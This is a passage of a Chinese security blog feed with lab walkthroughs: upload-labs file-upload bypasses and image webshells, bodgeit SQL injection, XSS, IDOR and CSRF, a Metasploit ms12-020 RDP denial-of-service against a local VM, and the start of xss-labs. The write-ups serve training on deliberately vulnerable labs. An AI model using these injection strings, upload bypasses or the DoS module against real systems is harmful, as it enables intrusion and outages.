variable">$DATA</span>'</span>, <span class="token string">''</span>, <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//去除字符串::<span class="token variable">$DATA</span> <span class="token variable">$file_ext</span> <span class="token operator">=</span> trim<span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //首尾去空<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Burp抓包，修改2.php为2.php. .文件成功上传:</p><img src="/posts/1702/5.png" class><h1 id="6、PASS-06——大小写绕过"><a href="#6、PASS-06——大小写绕过" class="headerlink" title="6、PASS-06——大小写绕过"></a>6、PASS-06——大小写绕过</h1><p>上传php文件不被允许上传，查看源代码，仔细观察，发现这题居然没有设置大小写转换，那我就直接尝试大小写绕过啦。其实PASS-05的思路这题同样适用。</p><p>抓包，修改2.php为2.Php，成功上传：</p><img src="/posts/1702/6.png" class><img src="/posts/1702/6_2.png" class><h1 id="7、PASS-07——空格绕过"><a href="#7、PASS-07——空格绕过" class="headerlink" title="7、PASS-07——空格绕过"></a>7、PASS-07——空格绕过</h1><p>php文件不允许上传，我们还是来看源代码吧，一看没有写去掉末尾空格的代码呀，那就直接空格绕过上传咯。Burp抓包，将2.php修改成2.php 发现成功上传</p><img src="/posts/1702/7.png" class><h1 id="8、PASS-08——点绕过"><a href="#8、PASS-08——点绕过" class="headerlink" title="8、PASS-08——点绕过"></a>8、PASS-08——点绕过</h1><p>直接上源代码，发现这题没有设置删除文件末尾的点的代码，那就在文件后面加点绕过啦。</p><p>这里点绕过的原理其实是利用windows的特性，在windows下，2.php.和2.php的效果是一样的。</p><p>Burp抓包，将2.php修改成2.php.成功上传。</p><img src="/posts/1702/8.png" class><h1 id="9、PASS-09——-DATA绕过上传"><a href="#9、PASS-09——-DATA绕过上传" class="headerlink" title="9、PASS-09——::$DATA绕过上传"></a>9、PASS-09——::$DATA绕过上传</h1><p>查看源代码，发现这里没有去除字符串::$DATA的代码，于是我们可以使用::$DATA绕过上传。</p><p>Burp抓包，将2.php修改成2.php::$DATA，发现成功上传</p><img src="/posts/1702/9.png" class><img src="/posts/1702/9_2.png" class><h1 id="10、PASS-10——点空格点绕过"><a href="#10、PASS-10——点空格点绕过" class="headerlink" title="10、PASS-10——点空格点绕过"></a>10、PASS-10——点空格点绕过</h1><p>这关的源代码和第五关一样，所以采用点空格点就能绕过。</p><p>Burp抓包，将2.php修改为2.php. .成功上传</p><img src="/posts/1702/10.png" class><h1 id="11、PASS-11——双写绕过"><a href="#11、PASS-11——双写绕过" class="headerlink" title="11、PASS-11——双写绕过"></a>11、PASS-11——双写绕过</h1><p>查看源代码，发现将图片的后缀用空白代替了。这时可以双写后缀名绕过。</p><pre class="line-numbers language-bash"><code class="language-bash"> <span class="token variable">$file_name</span> <span class="token operator">=</span> str_ireplace<span class="token punctuation">(</span><span class="token variable">$deny_ext</span>,<span class="token string">""</span>, <span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用burp抓包，将2.php修改成2.pphphp成功上传</p><img src="/posts/1702/11.png" class><h1 id="12、PASS-12——目录可控-00截断绕过（GET）"><a href="#12、PASS-12——目录可控-00截断绕过（GET）" class="headerlink" title="12、PASS-12——目录可控%00截断绕过（GET）"></a>12、PASS-12——目录可控%00截断绕过（GET）</h1><p>上传一个php文件，出现提示信息：</p><img src="/posts/1702/12.png" class><p>说明可能设置了白名单，查看源代码：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$ext_arr</span> <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token string">'jpg'</span>,<span class="token string">'png'</span>,<span class="token string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看到的确是设置了白名单，可以采用%00截断。</p><p>满足%00截断的两个条件：</p><pre class="line-numbers language-bash"><code class="language-bash">条件1：php版本小于5.3.4条件2：要将magic_quotes_gpc关闭<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/posts/1702/12_2.png" class><p>上传1.jpg，burp抓包，将save_path=../upload/修改为save_path=../upload/2.php%00</p><p>这样就相当于上传了2.php，并对后面的图片1.jpg进行了截断，成功上传</p><img src="/posts/1702/12_3.png" class><h1 id="13、PASS-13——目录可控-00截断绕过（POST）"><a href="#13、PASS-13——目录可控-00截断绕过（POST）" class="headerlink" title="13、PASS-13——目录可控%00截断绕过（POST）"></a>13、PASS-13——目录可控%00截断绕过（POST）</h1><p>上传一个php文件，也显示只允许上传.jpg|.png|.gif类型文件。应该也是设置了白名单，查看源代码。这题的代码好像跟PASS-12差不多耶，先抓包看看，发现明显不同，上一题中的save_path路径以GET方式直接显示出来了，这里的save_path明显是POST方式。所以我们可以用POST方式的%00截断绕过。</p><p>两者的区别就是GET会自行解码，POST不会自行解码，所以POST方式的需要我们手动将%00经过decoode进行解码。</p><p>Burp抓包，将../upload/修改为../upload/2.php%00</p><p>然后选中%00按如下方式进行decode，解码成功之后%00会看不见，实际存在。</p><img src="/posts/1702/13.png" class><p>修改完成之后，点击发送，文件上传成功：</p><img src="/posts/1702/13_2.png" class><h1 id="14、PASS-14——图片马绕过"><a href="#14、PASS-14——图片马绕过" class="headerlink" title="14、PASS-14——图片马绕过"></a>14、PASS-14——图片马绕过</h1><p>本题要求：</p><pre class="line-numbers language-bash"><code class="language-bash">上传图片马到服务器。注意：1.保证上传后的图片马中仍然包含完整的一句话或webshell代码。2.使用文件包含漏洞能运行图片马中的恶意代码。3.图片马要.jpg,.png,.gif三种后缀都上传成功才算过关！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先，制作图片马，在cmd中输入：</p><pre class="line-numbers language-bash"><code class="language-bash">copy 1.jpg/b+2.php/a 3.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成包含webshell的3.jpg，直接上传3.jpg。</p><p>本题直接说明存在文件上传漏洞：</p><img src="/posts/1702/14.png" class><p>于是，上传之后，抓包，查看文件路径，</p><img src="/posts/1702/14_2.png" class><p>访问：</p><img src="/posts/1702/14_3.png" class><p>.png和.gif的后缀按照同样的方法制作图片马，并上传，能够成功访问：</p><img src="/posts/1702/14_4.png" class><img src="/posts/1702/14_5.png" class><h1 id="15、PASS-15——getimagesize-图片马绕过"><a href="#15、PASS-15——getimagesize-图片马绕过" class="headerlink" title="15、PASS-15——getimagesize()图片马绕过"></a>15、PASS-15——getimagesize()图片马绕过</h1><p>本关卡要求和上一关一样，首先查看源代码，发现有：</p><pre class="line-numbers language-bash"><code class="language-bash"> <span class="token variable">$info</span> <span class="token operator">=</span> getimagesize<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>getimagesize()函数会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的。还是制作图片马上传即可。</p><p>制作图片马：</p><pre class="line-numbers language-bash"><code class="language-bash">copy 1.jpg/b+2.php/a 3.jpgcopy 1.png/b+2.php/a 3.pngcopy 1.gif/b+2.php/a 3.gif<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分别上传，使用文件包含漏洞访问上传的图片马中的恶意代码：</p><img src="/posts/1702/15.png" class><h1 id="16、PASS-16——exif-imagetype-图片马绕过"><a href="#16、PASS-16——exif-imagetype-图片马绕过" class="headerlink" title="16、PASS-16——exif_imagetype()图片马绕过"></a>16、PASS-16——exif_imagetype()图片马绕过</h1><p>查看源码，exif_imagetype() 读取一个图像的第一个字节并检查其签名。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$image_type</span> <span class="token operator">=</span> exif_imagetype<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>本题需要开启php_exif模块</p><img src="/posts/1702/16.png" class><p>解题过程跟PASS-14和PASS-15一样，利用图片马上传绕过。</p><p>使用文件包含漏洞访问上传的图片马中的恶意代码：</p><img src="/posts/1702/16_2.png" class><h1 id="17、PASS-17——图片二次渲染绕过"><a href="#17、PASS-17——图片二次渲染绕过" class="headerlink" title="17、PASS-17——图片二次渲染绕过"></a>17、PASS-17——图片二次渲染绕过</h1><p>查看源码，发现图片经过了二次渲染。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$im</span> <span class="token operator">=</span> imagecreatefromjpeg<span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>imagecreatefromjpeg()函数，二次渲染是会创建一个新图像，导致图片马的数据丢失，上传图片马失败。所以要绕过imagecreatefromjpeg()函数进行上传。</p><p>关于gif的图片比较简单：</p><pre class="line-numbers language-bash"><code class="language-bash">原理大致就是先上传一张正常的gif图片，将经过二次渲染的图片下载下来。然后利用工具找到两张图片渲染前后相同的部分，在相同部分写入webshell，再上传，即可成功绕过二次渲染。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>具体步骤，首先，先上传一张正常的图片2.gif，将生成的32421.gif与原来的2.gif进行对比，查找渲染前后没有变化的部分。用一个可以查看十六进制的工具，我用的是winhex，将两张图片放进去，然后在查看处选择同步和比较。</p><img src="/posts/1702/17.png" class><p>这种白色的都是相同的，黑色部分则是不相同的。</p><img src="/posts/1702/17_2.png" class><p>只需要在2.gif的白色部分，即相同部分，插入恶意代码即可。</p><img src="/posts/1702/17_3.png" class><p>将其另存为22.gif，然后上传到服务器。利用文件包含漏洞即可绕过二次渲染。</p><img src="/posts/1702/17_4.png" class><p>至于jpg和png的，用上面这种方法是不行的，你会发现当你在比较渲染前后图片相同位置时，都是一些断断速速的点，根本插不进去的。这里具体的实现还是要利用一些写的脚本，将webshell插入进去。具体实现可以参考[这篇文章](<a href="https://xz.aliyun.com/t/2657">upload-labs之pass 16详细分析 - 先知社区 (aliyun.com)</a>)</p><h1 id="18、PASS-18——条件竞争绕过"><a href="#18、PASS-18——条件竞争绕过" class="headerlink" title="18、PASS-18——条件竞争绕过"></a>18、PASS-18——条件竞争绕过</h1><p>查看源代码，发现本关卡是先将图片上传到服务器，再判断文件后缀是否在白名单，在则重命名，不在则删除。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$upload_file</span> <span class="token operator">=</span> UPLOAD_PATH <span class="token keyword">.</span> <span class="token string">'/'</span> <span class="token keyword">.</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>    if<span class="token punctuation">(</span>move_uploaded_file<span class="token punctuation">(</span><span class="token variable">$temp_file</span>, <span class="token variable">$upload_file</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        if<span class="token punctuation">(</span>in_array<span class="token punctuation">(</span><span class="token variable">$file_ext</span>,<span class="token variable">$ext_arr</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>             <span class="token variable">$img_path</span> <span class="token operator">=</span> UPLOAD_PATH <span class="token keyword">.</span> <span class="token string">'/'</span><span class="token keyword">.</span> rand<span class="token punctuation">(</span>10, 99<span class="token punctuation">)</span>.date<span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span>.<span class="token string">"."</span><span class="token keyword">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>             rename<span class="token punctuation">(</span><span class="token variable">$upload_file</span>, <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>            unlink<span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那我们就可以利用条件竞争来绕过。看看谁比谁快（bushi）。如果我们在上传上去的一瞬间访问这个文件，那他就不能对这个文件删除。这就相当于我们打开了一个文件，然后再去删除这个文件，就会提示这个文件在另一程序中打开无法删除。</p><p>上传一个2.php文件，burp抓包，将其发送给测试器Intruder，在position处清除负载。在payloads选择没有负载（Null payloads）,有效载荷选项（payload options）选择无限期地重复（continue indefinitely）。在options处将线程数调高一点，如20。</p><img src="/posts/1702/18.png" class><img src="/posts/1702/18_2.png" class><p>点击攻击，这边在不停的上传：</p><img src="/posts/1702/18_3.png" class><p>我们打开另一个浏览器，访问2.php的路径，找不到我就一直访问，总有你还没来得及删掉的时候吧，然后我第二次就直接访问到啦：</p><img src="/posts/1702/18_4.png" class><h1 id="19、PASS-19——条件竞争绕过"><a href="#19、PASS-19——条件竞争绕过" class="headerlink" title="19、PASS-19——条件竞争绕过"></a>19、PASS-19——条件竞争绕过</h1><p>查看源代码，这关是检查了后缀名，然后上传，然后再进行二次渲染。所以我们只能上传图片马，然后配合解析漏洞（即访问地址加上include.php?file）即可成功绕过。</p><p>这题的上传路径有点问题，没有上传到upload/upload目录下，所以我们先打开PASS-19的myupload.php修改一下路径：</p><img src="/posts/1702/19.png" class><p>先制作一张包含恶意代码的图片马：</p><pre class="line-numbers language-bash"><code class="language-bash">copy 1.jpg/b+2/php/a 3.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后上传3.jpg，并用burp抓包，其他操作跟PASS-18一样，发送到测试器，对它不断进行上传。</p><img src="/posts/1702/19_2.png" class><p>然后打开另一浏览器，不断访问图片地址(<a href="http://192.168.56.1:8099/upload/include.php?file=upload/3.jpg">http://192.168.56.1:8099/upload/include.php?file=upload/3.jpg</a>)</p><img src="/posts/1702/19_3.png" class><h1 id="20、PASS-20——-绕过"><a href="#20、PASS-20——-绕过" class="headerlink" title="20、PASS-20——/.绕过"></a>20、PASS-20——/.绕过</h1><p>查看源代码，本题是设置了一个黑名单，然后发现有一个move_uploaded_file()函数。这个函数有个特性，就是会忽略文件末尾的 /.   (或者用.也可以)</p><p>也就是说，我们先上传一张正常的图片1.jpg，然后用burp抓包，将upload-19.jpg改为2.php/.此时会上传2.php文件，并自动忽略/.后面的内容，即忽略1.jpg</p><img src="/posts/1702/20.png" class><p>还有一个方法。这个函数的img_path是由post参数的save_name控制的。所以可以利用POST方式的%00截断。</p><p>先上传一张正常的图片1.jpg,并用burp抓包，找到save_name,将upload-19.jpg改为2.php%00,并将%00进行url的decode，上传成功</p><img src="/posts/1702/20_2.png" class><h1 id="21、PASS-21——数组绕过"><a href="#21、PASS-21——数组绕过" class="headerlink" title="21、PASS-21——数组绕过"></a>21、PASS-21——数组绕过</h1><p>查看源码，如果是数组的话就不会检查后缀。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>in_array<span class="token punctuation">(</span><span class="token variable">$ext</span>, <span class="token variable">$allow_suffix</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"禁止上传该后缀文件!"</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>采用第一个数组和第二个数组拼接</p><pre class="line-numbers language-bash"><code class="language-bash"> <span class="token variable">$file_name</span> <span class="token operator">=</span> reset<span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token keyword">.</span> <span class="token string">'.'</span> <span class="token keyword">.</span> <span class="token variable">$file</span><span class="token punctuation">[</span>count<span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> - 1<span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那就可以利用数组绕过。</p><p>在这里，数组的下标不能相邻就行，比如第一个数组下标为0，第二个就要大于1，才不会被拼接起来。</p><p>首先，构造表单，能够数组上传，然后上传一张正常的照片1.jpg</p><img src="/posts/1702/21.png" class><p>Burp抓包，点击发送，成功上传</p><img src="/posts/1702/21_2.png" class><h1 id="22、总结"><a href="#22、总结" class="headerlink" title="22、总结"></a>22、总结</h1><p>最后，放上一张关于文件上传漏洞的总结图</p><img src="/posts/1702/22.png" class>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> upload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bodgeit靶场</title>
      <link href="/posts/1d0a.html"/>
      <url>/posts/1d0a.html</url>
      
        <content type="html"><![CDATA[<p>这两天在学长的引导下，我把bodgeit靶场练习了一下。以下是我练习的一些关卡。</p><span id="more"></span><p>在About Us中的Scoring page中可以查看关卡：</p><img src="/posts/1d0a/0.png" class><h1 id="1、利用注入漏洞万能密码登录账号"><a href="#1、利用注入漏洞万能密码登录账号" class="headerlink" title="1、利用注入漏洞万能密码登录账号"></a>1、利用注入漏洞万能密码登录账号</h1><p>尝试构造万能密码：</p><pre class="line-numbers language-bash"><code class="language-bash">test@thebodgeitstore.com<span class="token string">' or '</span>1<span class="token string">'='</span>1<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/1d0a/1.png" class><p>发现登录成功：</p><img src="/posts/1d0a/1_2.png" class><p>可以查看一下源代码，在login.jsp中，</p><img src="/posts/1d0a/1_3.png" class><p>其余两个用户也构造同样的万能密码：</p><pre class="line-numbers language-bash"><code class="language-bash">user1@thebodgeitstore.com<span class="token string">' or '</span>1<span class="token string">'='</span>1<span class="token comment" spellcheck="true">#</span>admin@thebodgeitstore.com<span class="token string">' or '</span>1<span class="token string">'='</span>1<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/posts/1d0a/1_4.png" class><img src="/posts/1d0a/1_5.png" class><h1 id="2、xss漏洞"><a href="#2、xss漏洞" class="headerlink" title="2、xss漏洞"></a>2、xss漏洞</h1><h2 id="（1）反射型XSS"><a href="#（1）反射型XSS" class="headerlink" title="（1）反射型XSS"></a>（1）反射型XSS</h2><p>发现search模块有个搜索框，尝试使用xss构造。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/1d0a/2.png" class><p>成功出现弹窗，说明存在xss漏洞。</p><img src="/posts/1d0a/2_1.png" class><h2 id="（2）存储型XSS"><a href="#（2）存储型XSS" class="headerlink" title="（2）存储型XSS"></a>（2）存储型XSS</h2><p>既然发现有反射型XSS漏洞，再找找存储型XSS。在Contact Us模块还有一个输入框。先尝试一下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现屏蔽掉了一些关键字：</p><img src="/posts/1d0a/2_2.png" class><p>可能是对某些关键字进行了过滤，再尝试一下大小写绕过：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>ScRipt<span class="token operator">></span>alert<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>/ScRipt<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现成功啦！</p><img src="/posts/1d0a/2_3.png" class><p>此时，查看一下源码，发现的确是对<script>和</script>进行特殊处理：</p><img src="/posts/1d0a/2_4.png" class><p>在注册处还存在一个xss，</p><pre class="line-numbers language-bash"><code class="language-bash">注册账号：test@qq.com<span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span>密码：12345<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/posts/1d0a/2_5.png" class><p>点击register注册后，会：</p><img src="/posts/1d0a/2_6.png" class><h1 id="3、以非管理员用户身份查找隐藏内容"><a href="#3、以非管理员用户身份查找隐藏内容" class="headerlink" title="3、以非管理员用户身份查找隐藏内容"></a>3、以非管理员用户身份查找隐藏内容</h1><p>在普通用户页面，查看源代码，发现有个被注释掉的超链接Admin,而它的页面对应为admin.jsp，有可能是后台</p><img src="/posts/1d0a/3.png" class><p>直接在网址输入即可访问，的确为后台：</p><img src="/posts/1d0a/3_2.png" class><h1 id="4、访问其他人的购物篮"><a href="#4、访问其他人的购物篮" class="headerlink" title="4、访问其他人的购物篮"></a>4、访问其他人的购物篮</h1><p>通过burp，修改b_id值，就可以越权访问其他人的购物篮。 其他人的BasketId在我们之前发现的admin后台处可以直接查看：</p><img src="/posts/1d0a/4.png" class><p>这里我们登录<a href="mailto:&#x74;&#x65;&#x73;&#x74;&#64;&#x74;&#104;&#x65;&#x62;&#x6f;&#x64;&#x67;&#101;&#105;&#116;&#115;&#x74;&#x6f;&#x72;&#101;&#x2e;&#99;&#x6f;&#x6d;">&#x74;&#x65;&#x73;&#x74;&#64;&#x74;&#104;&#x65;&#x62;&#x6f;&#x64;&#x67;&#101;&#105;&#116;&#115;&#x74;&#x6f;&#x72;&#101;&#x2e;&#99;&#x6f;&#x6d;</a>这个账号，点击Your Basket界面，并提交到burp</p><img src="/posts/1d0a/4_2.png" class><p>这里我们将b_id值改为10，即查看<a href="mailto:&#x74;&#101;&#115;&#x74;&#x40;&#x71;&#113;&#46;&#99;&#111;&#x6d;">&#x74;&#101;&#115;&#x74;&#x40;&#x71;&#113;&#46;&#99;&#111;&#x6d;</a>的购物篮，点击发送：</p><img src="/posts/1d0a/4_3.png" class><p>可以看到，此时，已经出现了<a href="mailto:&#x74;&#101;&#x73;&#116;&#x40;&#113;&#x71;&#46;&#99;&#x6f;&#109;">&#x74;&#101;&#x73;&#116;&#x40;&#113;&#x71;&#46;&#99;&#x6f;&#109;</a>的购物篮</p><img src="/posts/1d0a/4_4.png" class><h1 id="5、让商店欠你钱"><a href="#5、让商店欠你钱" class="headerlink" title="5、让商店欠你钱"></a>5、让商店欠你钱</h1><p>登录一个普通账号，在Your Basket界面，点击Update Basket，并用burp进行抓取</p><img src="/posts/1d0a/5.png" class><p>直接修改quantity的值，将其变成负数:</p><img src="/posts/1d0a/5_2.png" class><p>然后再发送回来，就可以让数量变成负数，此时的价格当然也变成了负，现在商店要给你付钱啦哈哈哈。</p><img src="/posts/1d0a/5_3.png" class><h1 id="6、CSRF漏洞"><a href="#6、CSRF漏洞" class="headerlink" title="6、CSRF漏洞"></a>6、CSRF漏洞</h1><p>修改密码处有个CSRF漏洞。 登录账号<a href="mailto:&#116;&#101;&#x73;&#x74;&#64;&#116;&#104;&#x65;&#98;&#111;&#x64;&#103;&#101;&#105;&#116;&#115;&#x74;&#x6f;&#114;&#x65;&#x2e;&#99;&#111;&#x6d;">&#116;&#101;&#x73;&#x74;&#64;&#116;&#104;&#x65;&#98;&#111;&#x64;&#103;&#101;&#105;&#116;&#115;&#x74;&#x6f;&#114;&#x65;&#x2e;&#99;&#111;&#x6d;</a>，在修改密码界面，修改密码：</p><img src="/posts/1d0a/6.png" class><p>提交并使用burp抓包，然后选择在burp中右键选择相关工具的CSRF PoC生成：</p><img src="/posts/1d0a/6_2.png" class><p>把POST改为GET:</p><img src="/posts/1d0a/6_3.png" class><p>然后选择用浏览器测试，复制地址：</p><img src="/posts/1d0a/6_4.png" class><p>将复制的地址，先放到浏览器，然后登录另一个账号<a href="mailto:&#117;&#x73;&#x65;&#x72;&#49;&#x40;&#116;&#104;&#x65;&#x62;&#111;&#x64;&#103;&#x65;&#105;&#x74;&#115;&#116;&#x6f;&#114;&#101;&#x2e;&#x63;&#x6f;&#x6d;">&#117;&#x73;&#x65;&#x72;&#49;&#x40;&#116;&#104;&#x65;&#x62;&#111;&#x64;&#103;&#x65;&#105;&#x74;&#115;&#116;&#x6f;&#114;&#101;&#x2e;&#x63;&#x6f;&#x6d;</a>，此时点击刚刚生成的地址，会发现user1的密码被修改了。</p><img src="/posts/1d0a/6_5.png" class>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bodgeit </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ms12-020-导致对方蓝屏</title>
      <link href="/posts/12eb.html"/>
      <url>/posts/12eb.html</url>
      
        <content type="html"><![CDATA[<p>本篇文章介绍关于msfconsole模块中ms12-020漏洞的解析。</p><span id="more"></span><h1 id="实验背景："><a href="#实验背景：" class="headerlink" title="实验背景："></a>实验背景：</h1><p>都是在虚拟机下进行的啦，靶机采用的是winxpens3，确保所用的靶机有相关的漏洞才能攻击成功哦。并且攻击机和靶机要处在同一局域网下才行哒，建议开启仅主机模式哦。还有一点，有些命令无效，可能是因为模式为普通用户模式，在命令前面使用sudo就好了，或者切换为root（su root)</p><h1 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h1><p>攻击机：kali ip地址：192.168.127.139</p><p>靶机：winxpens3 ip地址：192.168.127.138</p><h1 id="ms12-020（导致对方蓝屏）"><a href="#ms12-020（导致对方蓝屏）" class="headerlink" title="ms12-020（导致对方蓝屏）"></a>ms12-020（导致对方蓝屏）</h1><h2 id="1、配置命令"><a href="#1、配置命令" class="headerlink" title="1、配置命令"></a>1、配置命令</h2><p>确定靶机的3389端口打开</p><p>进入msfconsole，配置如下命令：</p><pre class="line-numbers language-bash"><code class="language-bash">search ms12-020   <span class="token comment" spellcheck="true">#查找ms12-020漏洞</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看信息，使用如下，这里因为0已经被修复，所以这里只能使用关于1的，不能使用use 0</p><img src="/posts/12eb/10.png" class><pre class="line-numbers language-bash"><code class="language-bash">use 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用如下，</p><pre class="line-numbers language-bash"><code class="language-bash">use auxiliary/dos/windows/rdp/ms12_020_maxchannelids<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选择之后，发现提示信息，按照提示信息配置：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> payload linux/x64/meterpreter/reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/12eb/11.png" class><p>然后查看并配置所需命令：</p><pre class="line-numbers language-bash"><code class="language-bash">show options<span class="token keyword">set</span> RHOSTS 192.168.127.138    <span class="token comment" spellcheck="true">#配置靶机地址</span><span class="token keyword">set</span> LHOST 192.168.127.139     <span class="token comment" spellcheck="true">#配置攻击机地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、运行攻击"><a href="#2、运行攻击" class="headerlink" title="2、运行攻击"></a>2、运行攻击</h2><p>完成前面的配置之后，运行：</p><pre class="line-numbers language-bash"><code class="language-bash">run       <span class="token comment" spellcheck="true">#或者使用exploit,来实现攻击</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/12eb/12.png" class><p>查看到出现seems down 表示攻击成功，已经致使目标机蓝屏了。</p><img src="/posts/12eb/13.png" class>]]></content>
      
      
      <categories>
          
          <category> msfconsole </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> msfconsole </tag>
            
            <tag> 攻击 </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss-labs题解</title>
      <link href="/posts/84ce.html"/>
      <url>/posts/84ce.html</url>
      
        <content type="html"><![CDATA[<p>前些时间把xss-labs的靶场练习了一下，其实如果想练习靶场的话，可以是从xss先开始的，sqli练习的我还停留在第四关。xss总共20关，还是好理解一点的，下面是我的一些理解。</p><span id="more"></span><h1 id="基本流程："><a href="#基本流程：" class="headerlink" title="基本流程："></a>基本流程：</h1><p>先输入一个payload，然后查看网页源码，先猜想一下，再去查看原php文件，验证猜想或者找到解题的关键。</p><p>提供一个直接查看源码的快捷方式：ctrl+U,</p><p>或者直接在网址前面输入view-source:   （一样的意思）我个人还是喜欢直接按ctrl+U的方式，比较方便。</p><h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><p>可以先查看第一关的源码，发现直接将值传递过去了</p><p>在level1.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span 